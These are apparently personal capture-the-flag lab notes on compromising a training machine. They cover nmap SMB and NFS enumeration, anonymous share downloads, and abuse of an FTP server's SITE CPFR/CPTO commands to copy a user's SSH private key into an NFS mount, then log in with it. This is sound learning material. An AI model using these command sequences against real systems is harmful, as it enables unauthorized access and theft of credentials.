nmap command has specific scripts to enum samba
`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.12.126`
Fo me what worked was, the regular nmap -A scipt `nmap -A IP -p445` - showed 3 shares
smb2-security-mode:, smb2-time, and some NETBIOS one, nbstat
let us inspect one of the shares. connect using my machine as so
`smbclient //10.10.12.126/anonymous`
NOTE- You can recursively download the SMB share too. Submit the username and password as nothing.
`smbget -R smb://MACHINE_IP/anonymous`
found ssh key and ftp server deets in the smb's log.txt file

NOTE - ==rpcbind==. is a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.
Example - if a remote client wants to use NFSv3, it contacts the 111 port, which tell the port number where the NFS is located.
To enumerate this, `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.12.126`
We see that "/var" is a mount

We'll now use the ftp server's vulnerability to move kenobi's ssh rsa key from the place it got created, to /var mount, which is a readable location for us.
With that, we read the ssh key, loginto ssh, try to get privesc to root.
once we connect to the ftp server, we see it is using a vulnerable version which lets unauthorized users to run a couple of commands that'll let us move files from the victim's machine to the mount. and since we know the name(loc) of the mount, and since the mount is accessible, we can access that file from the mount.

```sh
ftp IP 21
SITE CPFR /home/kenobi/.ssh/id_rsa #copy from - set the source file
#- file exists, and ready for destination
SITE CPTO /var/tmp/id_rsa #copy to - set the dest as a loc in /var

```
create a /tmp/kenobi, mount it to IP:/var as >mount IP:/var /tmp/kenobi
cp /tmp/kenobi/id_rsa .
==chmod 600 id_rsa== (600 is required for the ssh to take the key seriously)
ssh -i id_rsa kenobi@ip
$
Wow!
